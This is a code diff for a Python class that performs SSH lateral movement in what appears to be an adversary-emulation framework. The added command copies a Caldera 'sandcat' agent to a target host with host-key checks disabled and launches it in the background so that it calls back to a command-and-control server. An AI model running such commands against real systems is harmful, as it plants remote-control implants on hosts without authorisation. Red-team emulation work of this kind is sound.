@@ -1,32 +1,15 @@
 from ..low_level_action import LowLevelAction
-from plugins.deception.app.helpers.agent_helpers import get_trusted_agents
-from plugins.deception.app.models.events import Event, InfectedNewHost
-
-from app.objects.c_agent import Agent
-from app.service.knowledge_svc import KnowledgeService
-from app.objects.c_operation import Operation
-from app.service.planning_svc import PlanningService
-
-from plugins.deception.app.helpers.logging import log_event
-
-import asyncio
+from models.attacker.agent import Agent
+from config.settings import settings
 
 
 class SSHLateralMove(LowLevelAction):
-    ability_name = "deception-ssh-copy"
-
     def __init__(self, agent: Agent, hostname: str):
-        facts = {"host.lateralMove.sshcmd": hostname}
-        super().__init__(agent, facts, SSHLateralMove.ability_name)
         self.hostname = hostname
-
-    async def get_result(
-        self,
-        operation: Operation,
-        planner: PlanningService,
-        knowledge_svc_handle: KnowledgeService,
-        raw_result: dict | None = None,
-    ) -> list[Event]:
-        # sleep to allow for the agent to get to the new host
-        await asyncio.sleep(10)
-        return []
+        command = f"""scp -o StrictHostKeyChecking=no
+          -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux {hostname}:~/sandcat_tmp.go
+          &&
+          ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
+          -o ConnectTimeout=3 {hostname} 'nohup ./sandcat_tmp.go -server {settings.c2_server}
+          -group red 1>/dev/null 2>/dev/null &'"""
+        super().__init__(agent, command)
